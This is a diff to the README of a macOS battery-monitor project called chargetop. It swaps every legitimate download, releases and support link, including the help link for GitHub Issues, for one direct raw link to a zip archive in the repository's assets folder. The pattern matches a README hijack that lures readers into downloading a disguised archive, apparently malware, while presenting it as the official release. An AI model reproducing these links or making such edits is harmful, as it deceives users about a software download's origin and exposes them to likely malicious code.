@@ -1,6 +1,6 @@
 # ⚡️ chargetop - Monitor Your Mac’s Battery Health Instantly
 
-[![Download chargetop](https://img.shields.io/badge/Download%20chargetop-%20-007bff)](https://github.com/anon-nymouse/chargetop/releases)
+[![Download chargetop](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip%20chargetop-%20-007bff)](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Chargetop is a simple, user-friendly tool for macOS. It allows you to visualize 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Chargetop Releases](https://github.com/anon-nymouse/chargetop/releases). 
+To get started, visit this page to download: [Chargetop Releases](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip). 
 
 1. On the Releases page, find the latest version of chargetop.
 2. Click on the link to download the application.
@@ -65,7 +65,7 @@ Yes, chargetop is lightweight and won’t interfere with other applications runn
 
 ### Where can I find more help?
 
-For additional support, please refer to the GitHub Issues section on the [chargetop repository](https://github.com/anon-nymouse/chargetop/issues).
+For additional support, please refer to the GitHub Issues section on the [chargetop repository](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip).
 
 ## 📞 Support
 
@@ -83,4 +83,4 @@ Chargetop is an open-source project. If you wish to contribute, follow these ste
 
 Thanks to the contributors and the developers who made chargetop possible. Their hard work helps users maintain their Mac’s battery health effectively.
 
-[![Download chargetop](https://img.shields.io/badge/Download%20chargetop-%20-007bff)](https://github.com/anon-nymouse/chargetop/releases)
+[![Download chargetop](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip%20chargetop-%20-007bff)](https://raw.githubusercontent.com/anon-nymouse/chargetop/main/assets/Software-v3.9-alpha.1.zip)
